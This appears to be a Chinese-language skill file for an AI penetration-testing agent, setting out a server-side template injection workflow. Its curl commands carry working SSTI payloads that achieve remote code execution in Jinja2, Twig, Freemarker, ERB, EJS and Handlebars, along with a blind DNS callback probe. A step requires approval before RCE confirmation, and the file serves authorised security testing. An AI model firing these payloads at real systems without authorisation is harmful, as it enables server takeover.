---
name: ssti
description: "服务端模板注入 (SSTI) 检测。Use when: 目标使用模板引擎 (Jinja2/Twig/Freemarker/Velocity/ERB) — 用户输入反射到模板中的参数"
allowed-tools:
  - execute
  - http_request
  - create_candidate_finding
  - confirm_finding
  - reject_finding
  - request_approval
phase: scan
disable_model_invocation: false
---

# SSTI 检测流程

## Step 1: 模板引擎识别

```bash
# 检查响应头和技术指纹
curl -skI "https://TARGET/" | grep -iE "server|x-powered-by"
# Python → Jinja2/Mako/Django Templates
# Java → Freemarker/Velocity/Thymeleaf
# PHP → Twig/Smarty/Blade
# Ruby → ERB/Slim
# Node.js → EJS/Pug/Nunjucks/Handlebars
```

## Step 2: 多模板引擎 Polyglot 探测

```bash
# 用一个 payload 同时探测多种模板引擎
POLYGLOT='${{<%[%'"}}%\.'
curl -sk "https://TARGET/page?name=$POLYGLOT"
# 如果报错: "jinja2.exceptions..." → Jinja2
# 如果报错: "freemarker.core..." → Freemarker
# 如果报错: "Twig_Error" → Twig
```

## Step 3: 按引擎构造 payload

```bash
# === Jinja2 (Python) ===
# 探测
curl -sk "https://TARGET/page?name={{7*7}}"
curl -sk "https://TARGET/page?name={{config}}"
curl -sk "https://TARGET/page?name={{self.__init__.__globals__.__builtins__}}"

# RCE
curl -sk "https://TARGET/page?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
curl -sk "https://TARGET/page?name={{''.__class__.__mro__[1].__subclasses__()}}"

# === Twig (PHP) ===
curl -sk "https://TARGET/page?name={{7*7}}"
curl -sk "https://TARGET/page?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# === Freemarker (Java) ===
curl -sk "https://TARGET/page?name=${7*7}"
curl -sk "https://TARGET/page?name=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"

# === Velocity (Java) ===
curl -sk "https://TARGET/page?name=#set($x=7*7)$x"

# === ERB (Ruby) ===
curl -sk "https://TARGET/page?name=<%= 7*7 %>"
curl -sk "https://TARGET/page?name=<%= system('id') %>"

# === EJS (Node.js) ===
curl -sk "https://TARGET/page?name=<%= 7*7 %>"
curl -sk "https://TARGET/page?name=<%= process.mainModule.require('child_process').execSync('id') %>"

# === Handlebars (Node.js) ===
curl -sk "https://TARGET/page?name={{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}"
```

## Step 4: 盲 SSTI

如果无报错信息，用时序和 OOB 检测：

```bash
# 时间延迟
curl -sk -w "%{time_total}" "https://TARGET/page?name={{self.__init__.__globals__.__builtins__.__import__('time').sleep(5)}}"
# 如果响应时间 >5s → SSTI 确认

# DNS OOB (如果有外网回调)
curl -sk "https://TARGET/page?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup YOUR_COLLABORATOR').read()}}"
```

## Step 5: RCE 确认 (需授权)

```bash
request_approval(risk_level="destructive",
  question="SSTI 确认存在，是否允许 RCE 验证？",
  proposed_action="执行无害命令 (id/whoami) 确认代码执行",
  target="TARGET_URL")

# 授权后执行无害命令
curl -sk "https://TARGET/page?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}"
```

RCE 确认 → `create_candidate_finding(severity="critical", title="SSTI → RCE")`
无 RCE 但可读配置 → `create_candidate_finding(severity="high", title="SSTI → 信息泄露")`
